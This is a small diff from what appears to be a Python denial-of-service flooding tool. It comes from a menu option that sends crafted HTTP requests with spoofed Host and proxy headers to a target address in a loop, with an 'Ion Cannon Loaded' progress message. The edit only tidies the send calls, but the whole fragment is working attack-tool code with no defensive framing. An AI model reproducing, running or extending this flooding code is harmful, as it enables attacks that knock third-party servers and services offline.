@@ -3781,8 +3781,8 @@ elif answer == ("20"):
                 req2 += "Content-Length: 0"
                 req2 += "Host: " + str(fip) + "\r\n"
                 req2 += "Proxt-agent: " + str(fip) + "\r\n"
-                s.sendto((req).encode('ascii'), (ip,port))
-                s.sendto((req2).encode('ascii'), (ip,port))
+                s.sendto(req.encode('ascii'), (ip,port))
+                s.sendto(req2.encode('ascii'), (ip,port))
                 s.close()
                 print(f"{yellow}Ion Cannon Loaded : {red}", i, f"{yellow}%", end='\r')
             except ConnectionResetError:
